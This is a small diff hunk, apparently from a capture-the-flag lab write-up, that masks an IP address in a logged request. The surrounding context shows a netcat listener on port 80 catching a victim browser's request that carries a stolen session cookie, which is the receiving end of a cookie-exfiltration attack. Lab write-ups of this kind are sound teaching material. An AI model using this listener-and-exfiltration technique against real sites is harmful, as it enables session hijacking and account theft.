@@ -77,7 +77,7 @@ $ sudo nc -lnvp 80
 Listening on [0.0.0.0] (family 0, port 80)
 Connection from 10.10.138.108 45766 received!
 GET /?cookie=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
-Host: 10.9.35.106
+Host: 10.9.**.**
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
